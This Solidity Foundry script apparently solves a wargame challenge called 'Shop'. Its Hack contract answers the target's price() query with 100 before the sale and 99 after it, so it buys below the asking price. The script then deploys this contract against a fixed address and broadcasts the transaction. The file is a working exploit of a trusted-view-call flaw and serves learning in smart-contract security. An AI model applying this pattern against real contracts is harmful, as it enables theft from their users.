pragma solidity ^0.8;

import "forge-std/Script.sol";

interface IShop {
    function buy() external;
    function price() external view returns (uint256);
    function isSold() external view returns (bool);
}

contract Hack {
    IShop private immutable target;

    constructor(address _target) {
        target = IShop(_target);
    }

    function pwn() external {
        target.buy();
        require(target.price() == 99, "price != 99");
    }

    function price() external view returns (uint256) {
        if (target.isSold()) {
            return 99;
        }
        return 100;
    }
}


contract ShopSolution is Script {

    IShop target = IShop(0x2BcAda20C898323FCE793789619a3d0322001Aa2);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        Hack hack = new Hack(address(target));
        hack.pwn();
        vm.stopBroadcast();
    }
}